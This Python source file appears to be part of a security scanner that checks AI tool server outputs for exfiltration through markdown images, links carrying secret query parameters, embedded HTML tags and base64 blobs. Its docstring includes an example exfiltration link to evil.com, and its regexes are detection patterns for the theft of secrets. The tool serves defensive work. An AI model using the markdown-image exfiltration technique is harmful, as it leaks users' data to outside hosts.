"""
Shadowprint S2 Dynamic Prober: Tool Output Exfiltration Scanner.
Owner: Gaurang Udgirkar [G]

Inspects runtime tool responses, error messages, and return values for:
  - Markdown image exfiltration: ![alt](https://evil.com/?data=...)
  - Query parameter credential leaks: [link](https://...?secret=...)
  - Embedded HTML markup: <img src="...">, <script>, <iframe>
  - Large base64 encoded data blobs.
"""

import re
from uuid import uuid4
from typing import List, Dict, Any, Optional
from shadowprint.models import Finding

# High-precision patterns for output exfiltration
MD_IMAGE_EXFIL = re.compile(r'!\[.*?\]\((https?://[^\s)]+)\)', re.IGNORECASE)
MD_LINK_EXFIL = re.compile(r'\[.*?\]\((https?://[^\s)]*[?&](?:token|key|secret|exfil|leak|data|auth)=[^)]+)\)', re.IGNORECASE)
HTML_TAG_EXFIL = re.compile(r'<\s*(?:img|script|iframe|object|embed)\b[^>]*\bsrc=["\']?(https?://[^"\'\s>]+)', re.IGNORECASE)
BASE64_BLOB = re.compile(r'\b[A-Za-z0-9+/]{64,}={0,2}\b')


class OutputScanner:
    """Scans tool return objects for covert exfiltration syntax and data leaks."""

    def __init__(self, target_server: str):
        self.target_server = target_server

    def scan_output(self, tool_name: str, output: Any) -> List[Finding]:
        """
        Scans tool output payload (string, dict, or list) for exfiltration patterns.
        """
        findings: List[Finding] = []
        if output is None:
            return findings

        # Serialize output to string for textual scanning
        text = str(output)

        # 1. Markdown Image Exfiltration
        img_match = MD_IMAGE_EXFIL.search(text)
        if img_match:
            exfil_url = img_match.group(1)
            findings.append(
                Finding(
                    id=f"SP-S2-EXFIL-IMG-{uuid4().hex[:6].upper()}",
                    engine="S2",
                    target=self.target_server,
                    tool=tool_name,
                    category="MARKDOWN_EXFILTRATION",
                    severity="critical",
                    assessment="FAIL",
                    confidence="confirmed",
                    evidence_basis="runtime_observed",
                    claim="Tool claimed to return standard text or calculation output.",
                    evidence=f"Markdown image exfiltration tag detected: ![image]({exfil_url[:120]})",
                    remediation="Sanitize markdown formatting. Prevent rendering untrusted remote image tags.",
                    supporting_rules=["S2-MD-IMAGE-EXFIL", "CWE-200"],
                )
            )

        # 2. Link with Credential Query Parameters
        link_match = MD_LINK_EXFIL.search(text)
        if link_match:
            exfil_link = link_match.group(1)
            findings.append(
                Finding(
                    id=f"SP-S2-EXFIL-LINK-{uuid4().hex[:6].upper()}",
                    engine="S2",
                    target=self.target_server,
                    tool=tool_name,
                    category="DATA_EXFILTRATION",
                    severity="high",
                    assessment="FLAGGED",
                    confidence="confirmed",
                    evidence_basis="runtime_observed",
                    claim="Tool claimed to return non-sensitive links.",
                    evidence=f"Suspicious URL with sensitive query parameter detected: {exfil_link[:120]}",
                    remediation="Strip authorization and secret query parameters from generated URLs.",
                    supporting_rules=["S2-LINK-PARAM-EXFIL", "CWE-200"],
                )
            )

        # 3. Embedded HTML Tags
        html_match = HTML_TAG_EXFIL.search(text)
        if html_match:
            tag_url = html_match.group(1)
            findings.append(
                Finding(
                    id=f"SP-S2-EXFIL-HTML-{uuid4().hex[:6].upper()}",
                    engine="S2",
                    target=self.target_server,
                    tool=tool_name,
                    category="HTML_INJECTION",
                    severity="high",
                    assessment="FLAGGED",
                    confidence="confirmed",
                    evidence_basis="runtime_observed",
                    claim="Tool output should contain clean plain text or JSON.",
                    evidence=f"Raw HTML media element detected pointing to: {tag_url[:120]}",
                    remediation="Disallow raw HTML tags in tool responses.",
                    supporting_rules=["S2-HTML-TAG-EXFIL", "CWE-79"],
                )
            )

        # 4. Large Base64 Blob
        b64_match = BASE64_BLOB.search(text)
        if b64_match:
            blob_snippet = b64_match.group(0)[:60]
            findings.append(
                Finding(
                    id=f"SP-S2-EXFIL-B64-{uuid4().hex[:6].upper()}",
                    engine="S2",
                    target=self.target_server,
                    tool=tool_name,
                    category="SUSPICIOUS_BINARY_PAYLOAD",
                    severity="medium",
                    assessment="FLAGGED",
                    confidence="heuristic",
                    evidence_basis="runtime_observed",
                    claim="Tool returns readable structured text.",
                    evidence=f"Obfuscated high-entropy base64 payload detected: {blob_snippet}...",
                    remediation="Inspect encoded base64 payload to verify it does not contain binary malware or stolen data.",
                    supporting_rules=["S2-BASE64-BLOB", "CWE-116"],
                )
            )

        return findings
